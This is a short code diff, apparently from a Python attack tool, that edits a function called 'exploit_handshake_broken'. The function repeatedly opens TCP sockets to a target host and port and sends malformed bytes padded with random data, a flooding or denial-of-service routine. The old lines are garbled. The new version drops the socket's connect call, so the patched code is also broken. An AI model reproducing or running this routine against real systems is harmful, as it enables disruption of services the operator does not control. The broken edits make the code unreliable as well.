@@ -123,8 +123,8 @@ def exploit_handshake_broken(target_ip, target_port, duration, stop_event):
     start_time = time.time()
     while not stop_event.is_set() and (time.time() - start_time < duration):
         try:
-            sock = socket.socket(socket.AF_INET,sock.settimeout(0.1) # Timeout mínimo para no bloquear
-            sock.connect((target_ip, target_port))
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1) # Timeout mínimo para no bloquear
             # Payload más grande y variado
             sock.send(b"\xFF\xFF\x00" + os.urandom(random.randint(100, 300)))
             sock.close()
